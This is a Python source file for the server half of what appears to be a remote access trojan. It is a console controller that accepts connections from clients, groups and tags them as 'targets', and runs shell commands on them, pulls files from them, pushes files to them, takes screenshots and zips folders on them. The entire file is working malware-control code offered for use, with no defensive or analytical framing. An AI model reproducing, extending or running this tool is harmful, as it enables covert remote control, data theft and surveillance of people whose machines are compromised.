#!/usr/bin/env python3
# standard python libraries
import sys
import base64
import socket
from threading import Thread
# non-standard libraries
import texttable


class Server:
    def __init__(self):
        self.cmd_timeout = 30
        self.zip_compression_level = 0
        self.connection = Connection()

        while True:
            entered = input(">> ")
            if entered:
                command = entered[0].lower()
                attribute = entered[2:].split(" @ ")

                if command == "h":
                    self.print_help()
                elif command == "o" and len(attribute[0].split()) == 2 and attribute[0].split()[0].lower() in ["cmd_timeout", "zip_compression"]:
                    self.set_option(attribute[0].split()[0].lower(), attribute[0].split()[1])
                elif command == "l" and len(attribute) == 1:
                    self.generate_texttable(self.get_conn_fgoi(attribute[0].split()))
                elif command == "t" and len(attribute) == 2:
                    self.change_tag(attribute[0], self.get_conn_fgoi(attribute[1].split()))
                elif command == "r" and len(attribute) == 1:
                    self.remove_connection(self.get_conn_fgoi(attribute[0].split()))
                elif command == "g" and len(attribute) == 2 and attribute[0].split()[0].lower() in ["add", "rm"]:
                    self.edit_group(attribute[0].split()[0].lower(), self.get_conn_fgoi(attribute[0].split()[0:]), attribute[1].split())
                elif command == "c" and len(attribute) == 2:
                    self.execute_command(attribute[0], self.get_conn_fgoi(attribute[1].split()))
                elif command == "d" and len(attribute) == 3:
                    self.download_file(attribute[0], attribute[1], self.get_conn_fgoi(attribute[2].split()))
                elif command == "u" and len(attribute) == 3:
                    self.upload_file(attribute[0], attribute[1], self.get_conn_fgoi(attribute[2].split()))
                elif command == "s" and len(attribute) == 3:
                    self.make_screenshot(attribute[0].split()[0], attribute[0].split()[1], self.get_conn_fgoi(attribute[2].split()))
                elif command == "z" and len(attribute) == 3:
                    self.zip_file_or_folder(attribute[0], attribute[1], self.get_conn_fgoi(attribute[2].split()))
                elif command == "x":
                    self.connection.sock.close()
                    break
                else:
                    print("[-] InvalidInputError")
            else:
                print("[-] InvalidInputError")

    def print_help(self):
        print("h show this page")
        print("o [cmd_timeout] [value] set option")
        print("l [group(s) or index(s)] list clients")
        print("t [tag] @ [group(s) or index(s)] change tag")
        print("r [group(s) or index(s)] close and remove connection")
        print("g [add/rm] [group(s) or index(s)] @ [group name] change group")
        print("c [command] @ [group(s) or index(s)]  execute console command (Win: 'chcp 65001' for unicode encoding)")
        print("d [path to open] @ [path to save] @ [group(s) or index(s)] download a file from target")
        print("u [path to open] @ [path to save] @ [group(s) or index(s)] upload a file to target")
        print("s [monitor] [path_to_save] @ [group(s) or index(s)] capture screenshot")
        print("z [path_to_open] @ [path_to_save] @ [group(s) or index(s)]")
        print("x exit server")

    def generate_texttable(self, connections):
        table = texttable.Texttable()
        rows = [["INDEX", "ADDRESS", "PORT", "TAG", "GROUPS"]]
        for index, (connection, address, port, tag, groups) in enumerate(self.connection.connections):
            if connection in connections:
                rows.append([index, address, port, tag, ", ".join(groups)])
        table.add_rows(rows)
        print(table.draw())

    def set_option(self, option, value):
        option = option.lower()
        if option == "cmd_timeout":
            try:
                self.cmd_timeout = int(value)
            except ValueError:
                print("[-] InvalidTimeout")
        elif option == "zip_compression":
            try:
                if int(value) not in range(10):
                    print("[-] InvalidCompressionLevel")
                else:
                    self.zip_compression_level = int(value)
            except ValueError:
                print("[-] InvalidCompressionLevel")
        else:
            print("[-] UnknownOption")

    def change_tag(self, tag, connections):
        for index, (connection, _, _, _, _) in enumerate(self.connection.connections):
            if connection in connections:
                self.connection.connections[int(index)][3] = tag

    def remove_connection(self, connections):
        remove_entries = list()
        for entry in self.connection.connections:
            connection, _, _, _, _ = entry
            if connection in connections:
                try:
                    self.connection.send("r".encode(self.connection.CODEC), connection)
                except socket.error:
                    pass 
                connection.close()
                remove_entries.append(entry)
        for entry in remove_entries:
            self.connection.connections.remove(entry)

    def edit_group(self, mode, connections, group_names):
        if mode == "add":
            for index, (connection, _, _, _, _) in enumerate(self.connection.connections):
                if connection in connections:
                    for name in group_names:
                        if name not in self.connection.connections[index][4]:
                            self.connection.connections[index][4].append(name)
                        else:
                            print("[-] TargetAlreadyInGroup")

        elif mode == "rm":
            for index, (connection, _, _, _, _) in enumerate(self.connection.connections):
                if connection in connections:
                    for name in group_names:
                        try:
                            self.connection.connections[index][4].remove(name)
                        except ValueError:
                            print("[-] TargetNotInGroup")

    def execute_command(self, command, connections):
        data = ("c" + str(self.cmd_timeout) + " " + command).encode(self.connection.CODEC)
        for connection in connections:
            try:
                self.connection.send(data, connection)
                print(self.connection.recv(connection).decode(self.connection.CODEC))
            except socket.error as error:
                self.update_line("\r[-] SocketError: " + str(error) + ": " + str(self.get_id_by_connection(connection)) + "\n")

    def download_file(self, path_to_open, path_to_save, connections):
        for connection in connections:
            try:
                self.connection.send(("d" + path_to_open).encode(self.connection.CODEC), connection)
                header = self.connection.recv(connection).decode(self.connection.CODEC)
                if header.startswith("[-]"):
                    print(header)
                else:
                    len_data_total = int(header)
                    data = bytes()
                    while not data.endswith(self.connection.END_MARKER):
                        data += connection.recv(self.connection.PACKET_SIZE)
                        len_data_current = len(data)
                        self.update_line("\r[*] " + str(int(len_data_current / (len_data_total / 100))) + "% complete")
                    data = base64.b64decode(data[:-(len(self.connection.END_MARKER))])
                    with open(path_to_save, "wb") as file:
                        file.write(data)
            except socket.error as error:
                self.update_line("\r[-] SocketError: " + str(error) + ": " + str(self.get_id_by_connection(connection)))
            print()

    def upload_file(self, path_to_open, path_to_save, connections):
        try:
            with open(path_to_open, "rb") as file:
                data = base64.b64encode(file.read()) + self.connection.END_MARKER
        except FileNotFoundError:
            print("[-] FileNotFoundError")
        except PermissionError:
            print("[-] PermissionError")
        else:
            for connection in connections:
                try:
                    len_data_total = len(data)
                    self.connection.send(("u" + path_to_save).encode(self.connection.CODEC), connection)
                    while data:
                        connection.send(data[:1024])
                        data = data[1024:]
                        len_data_current = len_data_total - len(data)
                        self.update_line("\r[*] " + str(int(len_data_current / (len_data_total / 100))) + "% complete")
                except socket.error as error:
                    self.update_line("\r[-] SocketError: " + str(error) + ": " + str(self.get_id_by_connection(connection)))
                print()

    def make_screenshot(self, monitor, path_to_save, connections):
        for connection in connections:
            try:
                data = ("s" + monitor + " " + path_to_save).encode(self.connection.CODEC)
                self.connection.send(data, connection)
                response = self.connection.recv(connection).decode(self.connection.CODEC)
                if response.startswith("[-]"):
                    print(response)
            except socket.error as error:
                print("[-] SocketError: " + str(error) + ": " + str(self.get_id_by_connection(connection)))

    def zip_file_or_folder(self, path_to_open, path_to_save, connections):
        for connection in connections:
            try:
                self.connection.send(("z" + str(self.zip_compression_level) + path_to_open + " @ " + path_to_save).encode(self.connection.CODEC), connection)
                response = self.connection.recv(connection).decode(self.connection.CODEC)
                if response.startswith("[-]"):
                    print(response)
            except socket.error as error:
                print("[-] SocketError: " + str(error) + ": " + str(self.get_id_by_connection(connection)))

    def get_conn_fgoi(self, objects):  # get connections from groups or indexs
        connections = list()
        for obj in objects:
            for index, (connection, _, _, _, groups) in enumerate(self.connection.connections):
                if obj in groups:
                    if connection not in connections:
                        connections.append(connection)
                elif str(index) == obj:
                    if connection not in connections:
                        connections.append(self.connection.connections[int(index)][0])
        return connections

    def get_id_by_connection(self, connection):
        for index, (c, _, _, _, _) in enumerate(self.connection.connections):
            if connection == c:
                return index

    def update_line(self, text):
        sys.stdout.write(text)
        sys.stdout.flush()


class Connection:
    def __init__(self):
        self.CODEC = "utf8"
        self.PACKET_SIZE = 1024
        self.END_MARKER = "-".encode(self.CODEC)
        self.connections = list()

        HOST = "127.0.0.1"
        PORT = 10009

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        self.sock.bind((HOST, PORT))
        print("[*] server running")
        accepting_thread = Thread(target=self.accept_new_connections, args=(self.sock,))
        accepting_thread.start()
        print("[*] waiting for clients")

    def accept_new_connections(self, sock):
        while True:
            sock.listen()
            connection, (address, port) = sock.accept()
            self.connections.append([connection, address, port, "no tag", ["all"]])

    def send(self, data, connection):
        data = base64.b64encode(data) + self.END_MARKER
        connection.send(data)

    def recv(self, connection):
        data = bytes()
        while not data.endswith(self.END_MARKER):
            data += connection.recv(self.PACKET_SIZE)
        return base64.b64decode(data[:-1])


if __name__ == "__main__":
    server = Server()
